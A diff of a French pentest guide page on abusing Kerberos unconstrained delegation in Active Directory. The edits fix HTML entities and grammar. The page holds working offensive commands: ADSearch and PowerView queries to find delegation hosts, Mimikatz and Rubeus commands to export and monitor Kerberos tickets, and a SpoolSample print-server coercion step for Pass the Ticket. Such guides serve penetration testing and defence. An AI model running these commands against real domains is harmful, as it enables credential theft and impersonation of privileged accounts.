@@ -14,14 +14,14 @@ Vous pouvez **trouver des objets ordinateur avec cet attribut** en vérifiant si
 ## Powerview
 Get-NetComputer -Unconstrained #Les DC apparaissent toujours mais ne sont pas utiles pour l'élévation de privilèges
 <strong>## ADSearch
-</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Exporter les tickets avec Mimikatz
 </strong>privilege::debug
 sekurlsa::tickets /export #Méthode recommandée
 kerberos::list /export #Autre méthode
 
 # Surveiller les connexions et exporter de nouveaux tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Vérifier toutes les 10s pour de nouveaux TGTs</code></pre>
+.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Vérifier toutes les 10s pour de nouveaux TGTs</code></pre>
 
 Chargez le ticket de l'administrateur (ou de l'utilisateur victime) en mémoire avec **Mimikatz** ou **Rubeus pour un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 Plus d'infos : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
@@ -29,7 +29,7 @@ Plus d'infos : [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https:
 
 ### **Forcer l'authentification**
 
-Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Délégation non contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **sauvegardant un TGT** dans la mémoire du serveur.\
+Si un attaquant est capable de **compromettre un ordinateur autorisé pour "Délégation non contrainte"**, il pourrait **tromper** un **serveur d'impression** pour **se connecter automatiquement** contre lui **en sauvegardant un TGT** dans la mémoire du serveur.\
 Ensuite, l'attaquant pourrait effectuer une **attaque Pass the Ticket pour usurper** le compte d'ordinateur du serveur d'impression.
 
 Pour faire connecter un serveur d'impression contre n'importe quelle machine, vous pouvez utiliser [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
